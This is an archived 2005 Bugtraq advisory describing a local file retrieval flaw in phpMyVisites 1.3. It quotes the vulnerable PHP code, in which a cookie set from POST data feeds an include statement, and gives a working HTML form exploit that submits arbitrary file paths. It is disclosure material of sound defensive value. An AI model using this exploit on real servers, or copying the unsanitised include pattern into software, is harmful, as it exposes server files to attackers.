=== Content from marc.info_23f38f10_20250125_063112.html ===

```
[[prev in list](?l=bugtraq&m=111462331425645&w=2)] [[next in list](?l=bugtraq&m=111455417708712&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [exploits] phpMyVisites 1.3 local file retrieval
From:       [Max Cerny <max () czerny ! cz>](?a=111454325100002&r=1&w=2)
Date:       [2005-04-26 19:35:00](?l=bugtraq&r=1&w=2&b=200504)
Message-ID: [20050426193500.9467.qmail () www ! securityfocus ! com](?i=20050426193500.9467.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=111454298603060&q=mbox) or [body](?l=bugtraq&m=111454298603060&q=raw)]

==================================================================
File: phpMyVisites 1.3 local file retrieval
From: remote
Date: 26/04/2005
Credits: Max Cerny (max[at]czerny[dot]cz)
Vendor: <http://www.phpmyvisites.net>
Affected version: 1.3, > not tested
==================================================================

==================================================================
Description:
 Remote user can retrieve local file on the webserver
phpMyVisites is running on. It's cause due to bad user data
validation code.

FILE: include/set_lang.php

line 94:
 include "./langs/".$lang['default_lang'];

assuming, we have set $lang['default_lang'] on line 66:
 $lang['default_lang'] = $_COOKIE[$nomcookielg];

it's good, look onto
line 40:
 setcookie($nomcookielg,$_POST['mylang'],time()+3600*24*365*10);

Now, we are able to spoof the value of $_POST['mylang'] to any file,
we want to be retrieved.

==================================================================

==================================================================
Exploit:
 <form action="http://[pathtoyourphpMyVisites]/login.php" method="POST">
Local file: <input type="text" name="mylang" value="" />
<input type="submit" value="Alexx says RELAX!">
</form>

==================================================================

==================================================================
Fix:
 Contact the Vendor

==================================================================
			Have a nice Day !
==================================================================
[[prev in list](?l=bugtraq&m=111462331425645&w=2)] [[next in list](?l=bugtraq&m=111455417708712&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


